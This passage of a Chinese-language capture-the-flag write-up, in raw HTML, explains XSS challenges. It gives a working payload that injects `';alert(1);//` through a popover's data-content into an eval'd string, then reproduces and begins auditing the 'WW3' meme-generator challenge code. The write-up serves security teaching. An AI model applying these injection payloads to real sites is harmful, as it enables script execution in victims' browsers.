src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png" alt></p><p>&#x5C3D;&#x7BA1; eval &#x6267;&#x884C;&#x51FA;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0; number &#x6807;&#x7B7E;&#x5F53;&#x4E2D;&#x786E;&#x5B9E;&#x88AB;&#x6211;&#x4EEC;&#x6CE8;&#x5165;&#x4E86;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x5185;&#x5BB9;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover fade bs-popover-right show&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tooltip&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;popover238474&quot;</span> <span class="hljs-attr">x-placement</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arrow&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-header&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;popover-body&quot;</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x5185;&#x5BB9;:<code>7&lt;template&gt;hello&lt;/template&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F; 7 &#x4E0E; hello &#xFF0C;<code>&lt;template&gt;</code>&#x5C31;&#x662F; popper.js &#x5B9E;&#x73B0;&#x7684; popover &#x529F;&#x80FD;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x5173;&#x6CE8;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x5982;&#x4F55;&#x5728;<code>$str=&quot;$1&lt;template&gt;$any&lt;/template&gt;&quot;;eval($str);</code>&#x5F53;&#x4E2D;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x5230;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x7B54;&#x6848;&#x5DF2;&#x7ECF;&#x547C;&#x4E4B;&#x6B32;&#x51FA;&#x4E86;&#xFF0C;&#x65E2;&#x7136;&#x662F;&#x5728;<code>eval</code>&#x5F53;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7B2C;&#x4E00;&#x4F4D;&#x4E3A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x7531;&#x4E8E;&#x4E2D;&#x95F4;<code>$any</code>&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x53EF;&#x63A7;&#xFF0C;&#x540E;&#x9762;&#x518D;&#x7528;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#x5C06;<code>&lt;template&gt;</code>&#x53D8;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;<code>//</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;<code>&lt;/template&gt;</code>&#x5373;&#x53EF;&#xFF0C;&#x6574;&#x4E2A; payload &#x5373;&#x662F;<code>&apos;&lt;tamplate&gt;&apos;;alert();//&lt;/tamplate&gt;</code>&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FD9;&#x4E48;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">&quot;#number&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;&apos;;alert(1);//&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5373;&#x53EF;&#x5B9E;&#x73B0; XSS&#xFF0C;&#x6240;&#x4EE5; payload:</p><p></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">number</span>=&apos;&amp;name=&lt;button id<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;keanu&quot;</span> data-toggle<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;popover&quot;</span> data-container<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;%23number&quot;</span> data-content<span class="hljs-number">%3</span>D<span class="hljs-string">&quot;&apos;%3Balert(1)%3B%2F%2F&quot;</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png" alt></p><h2 id="WW3"><a href="#WW3" class="headerlink" title="WW3"></a>WW3</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Meme Code<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;meme-code&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;4&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;notify&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Utils */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function">(<span class="hljs-params">dirty</span>) =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&apos;&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">        return (`<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;</span>);`+</span></span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span>+</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;meme-card&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;${img}&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>${text}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">        if (text &amp;&amp; img) {</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) {</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                html = (`<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-warning&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Meme<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> created from ${DOMPurify.sanitize(text)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#status&apos;</span>).remove()</span></span><br><span class="line"><span class="hljs-javascript">                notify ? ($(<span class="hljs-string">&apos;#notify&apos;</span>).html(html)) : <span class="hljs-string">&apos;&apos;</span></span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(template)</span></span><br><span class="line">            }, 1000)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;text&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;img&apos;</span>)</span></span><br><span class="line">    if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>`+</span></span></span><br><span class="line"><span class="hljs-actionscript">            `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(img)}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;`+</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">        )</span><br><span class="line"><span class="hljs-actionscript">    } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(memeTemplate(<span class="hljs-string">&apos;https://i.imgur.com/PdbDexI.jpg&apos;</span>, <span class="hljs-string">&apos;When you get that WW3 draft letter&apos;</span>))</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8BA9;&#x6211;&#x6DF1;&#x6DF1;&#x5730;&#x4F53;&#x4F1A;&#x5230;&#x4E86; JavaScript &#x7684;&#x6076;&#x610F;&#x2026;&#x5148;&#x653E;&#x4E2A;&#x56FE;&#xFF0C;&#x5927;&#x5BB6;&#x81EA;&#x884C;&#x5148;&#x4F53;&#x4F1A;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.redd.it/rz3o1yibnc511.png" alt></p><p>&#x9898;&#x76EE;&#x7528;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x4EE3;&#x7801;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x4EE5;&#x53CA;&#x8F93;&#x51FA;&#x81EA;&#x5B9A;&#x4E49; text &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECD;&#x65E7;&#x662F;&#x4E0A;&#x9898;&#x7684;&#x56DB;&#x4E2A;&#x5916;&#x90E8; JS &#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x5927;&#x6BB5; JS &#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x6D89;&#x53CA;&#x5230; JavaScript &#x6BD4;&#x8F83;&#x591A;&#x7684;&#x9ED1;&#x9B54;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x4E2A;&#x4E2A;&#x6765;&#x770B;&#x770B;&#x3002;</p><p>&#x5BA1;&#x8BA1;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x5230;&#x9898;&#x76EE;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function"><span class="hljs-params">dirty</span> =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x8FC7;&#x6EE4;&#x6211;&#x4EEC;&#x7684; img &#x53C2;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> (</span><br><span 